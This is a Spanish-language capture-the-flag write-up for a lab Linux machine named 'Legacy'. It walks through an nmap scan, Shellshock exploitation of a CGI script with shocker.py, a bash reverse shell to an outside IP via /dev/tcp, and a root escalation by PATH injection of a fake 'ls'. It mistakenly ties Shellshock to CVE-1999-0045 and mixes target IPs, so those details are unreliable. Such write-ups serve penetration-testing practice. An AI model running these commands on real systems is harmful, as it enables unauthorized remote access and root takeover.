# Legacy - HACKMEX

**OS**: Linux   
**Dificultad**: Medium   
**Puntos**: 6,200   
**Solucionado por**: M41w4r3

## Resumen 
- SHELLSHOCK RCE
- PATH INJECTION 
## Nmap Scan
```
nmap -A -p- -oN legacy -T4 10.0.30.121
Warning: 10.0.50.121 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.0.50.121
Host is up (0.087s latency).
Not shown: 65499 closed ports, 35 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.34 ((Unix) mod_ssl/2.2.34 OpenSSL/1.0.1t DAV/2)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.34 (Unix) mod_ssl/2.2.34 OpenSSL/1.0.1t DAV/2
|_http-title: NCSA Legacy
```

## Enumeracion 
Al enumerar podemos encontrar una pagina que nos muestra que se esta ejecutando el aplicativo NCSA
Asi que al investigar un poco podemos encontrar una vulnerabilidad en los archivos cgi-bin
'''
CVE-1999-0045 
'''

## Explotar CGI-BIN

Al encontrar que podemos ejecutar codigo remotamente mediante CGI-BIN lo que se conoce como shellshock
encontre un exploit llamado shocker que nos permite automatizar el proceso del shellshock
En esta area encontramos diferentes scripts pero el que nos permitia explotar dicha vulnerabilidad era el archivo "date"

asi que el comando utilizado fue python 
```python
shocker.py  -H 10.0.30.121 --command "/bin/cat /etc/passwd" -c /cgi-bin/date
```
Despues de esto lo que ejecute fue una shell inversa con bash el comando utilizado fue : 
```/bin/bash -i >& /dev/tcp/10.10.0.62/1111 0>&1```
y asi pude obtener una reverse shell con el servidor

## Privilege Escalation 

identificamos un archivo llamado tftp en la carpeta de cgi-bin 
notamos que tiene permisos de root ademas de que es un archivo ejecutable "ELF" asi que lo ejecutamos

despues de eso identificamos que tenemos que hacer un path injection porque nos muestra un error relacionado a el **ls** asi que vamos a injectarle otra instruccion 
lo siguiente es crear un archivo en la carpeta de tmp : 
```
echo "/bin/sh" > ls 
```
Esto nos permitira elevar privilegios para obtener el usuario root
despues realizamos el path injection con el siguiente comando : ```export PATH=/tmp/:$PATH```
despues ejecutamos el archivo y nos da la shell de root

## Archivos utilizados 
*shocker.py*
## Referencias

- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/archive/security-advisories/cgi_nph_test_disclosure_exploit
- https://github.com/nccgroup/shocker 
